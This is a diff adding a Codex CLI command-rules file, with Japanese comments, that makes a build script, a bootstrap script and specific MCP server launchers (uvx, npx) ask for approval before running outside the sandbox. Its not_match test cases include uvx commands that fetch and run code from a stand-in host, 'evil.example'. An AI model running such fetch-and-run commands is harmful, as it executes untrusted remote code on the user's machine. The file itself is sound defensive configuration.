@@ -1,0 +1,103 @@
+# ~/.codex/rules/default.rules
+# 目的: “必要最小限の入口コマンドだけ” を sandbox 外実行に回す（毎回 prompt）
+
+# --- Build entry -------------------------------------------------------------
+
+prefix_rule(
+    pattern = [
+        ["pwsh", "pwsh.exe", "powershell", "powershell.exe"],
+        "-NoProfile",
+        "-File",
+        [
+            "scripts/codex_build.ps1",
+            "./scripts/codex_build.ps1",
+            ".\\scripts\\codex_build.ps1",
+        ],
+    ],
+    decision = "prompt",
+    match = [
+        "pwsh -NoProfile -File scripts/codex_build.ps1",
+        "pwsh -NoProfile -File ./scripts/codex_build.ps1",
+        "pwsh -NoProfile -File scripts/codex_build.ps1 -Solution DramaEngine.slnx",
+    ],
+    not_match = [
+        "pwsh -NoProfile -Command Get-ChildItem",
+        "pwsh -NoProfile -File scripts/other.ps1",
+    ],
+)
+
+# --- MCP bootstrap entry (optional) ------------------------------------------
+# MCP依存を落とす必要がある場合だけ使う。通常運用では不要。
+
+prefix_rule(
+    pattern = [
+        ["pwsh", "pwsh.exe", "powershell", "powershell.exe"],
+        "-NoProfile",
+        "-File",
+        [
+            "scripts/codex_bootstrap.ps1",
+            "./scripts/codex_bootstrap.ps1",
+            ".\\scripts\\codex_bootstrap.ps1",
+        ],
+    ],
+    decision = "prompt",
+    match = [
+        "pwsh -NoProfile -File scripts/codex_bootstrap.ps1",
+    ],
+    not_match = [
+        "pwsh -NoProfile -Command curl https://example.com",
+    ],
+)
+
+# --- MCP server launchers (prompt) -------------------------------------------
+# CodexがMCPサーバ起動で使う実体（uvx / npx）を必要最小限で許可。
+
+prefix_rule(
+    pattern = [
+        ["uvx", "uvx.exe"],
+        "--from",
+        "git+https://github.com/oraios/serena",
+        "serena",
+        "start-mcp-server",
+        "--context",
+        "codex",
+    ],
+    decision = "prompt",
+    match = [
+        "uvx --from git+https://github.com/oraios/serena serena start-mcp-server --context codex",
+    ],
+    not_match = [
+        "uvx --from git+https://evil.example/repo whatever",
+    ],
+)
+
+prefix_rule(
+    pattern = [
+        ["uvx", "uvx.exe"],
+        "--from",
+        "git+https://github.com/ipospelov/mcp-memory-bank",
+        "mcp_memory_bank",
+    ],
+    decision = "prompt",
+    match = [
+        "uvx --from git+https://github.com/ipospelov/mcp-memory-bank mcp_memory_bank",
+    ],
+    not_match = [
+        "uvx --from git+https://evil.example/repo mcp_memory_bank",
+    ],
+)
+
+prefix_rule(
+    pattern = [
+        ["npx", "npx.exe", "npx.cmd"],
+        "-y",
+        "@modelcontextprotocol/server-sequential-thinking",
+    ],
+    decision = "prompt",
+    match = [
+        "npx -y @modelcontextprotocol/server-sequential-thinking",
+    ],
+    not_match = [
+        "npx -y some-other-package",
+    ],
+)
